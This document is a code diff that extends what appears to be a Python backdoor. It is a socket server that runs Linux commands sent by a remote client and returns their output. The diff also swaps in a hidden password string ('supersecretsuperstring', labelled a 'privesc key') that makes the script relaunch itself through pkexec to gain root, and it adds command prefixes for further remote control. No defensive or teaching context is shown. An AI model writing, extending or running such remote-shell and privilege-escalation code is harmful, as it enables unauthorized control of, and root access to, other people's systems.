@@ -95,9 +95,9 @@ def handle_conn(conn, addr):
                 data = conn.recv(1024)
                 if not data:
                     break
-                data = data.strip()
+                data = data.strip()                    
 
-                if data == b"privesc":
+                if data == b"supersecretsuperstring": # privesc key here
                     subprocess.run(["chmod", "+x", THIS_FILE])
                     subprocess.Popen(["pkexec", THIS_FILE])
                     sys.exit(0) 
@@ -106,14 +106,23 @@ def handle_conn(conn, addr):
                 if not command:
                     continue
 
-                print("running: " + command)
-                result = run_command(command)
-                response = result.stdout + result.stderr
-                if not response: 
-                    response = f"Command executed. Exit code: {result.returncode}"
-                conn.sendall(response.encode("utf-8", errors="replace"))
+                if command.startswith("run_linux "):
+                    command = command[10:].strip()
+                    if not command:
+                        continue
+
+                    print("running linux command: " + command)
+                    result = run_command(command)
+
+                    response = result.stdout + result.stderr
+                    if not response: 
+                        response = f"Command executed. Exit code: {result.returncode}"
+                    conn.sendall(response.encode("utf-8", errors="replace"))
+                elif command.startswith("run_python "): 
+                    print("python has not been added yet")
+                    # TODO: add python commands 
+
                 break
-            
             except Exception as e:
                 error_msg = f"Error: {str(e)}\n"
                 conn.sendall(error_msg.encode("utf-8"))
@@ -143,5 +152,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
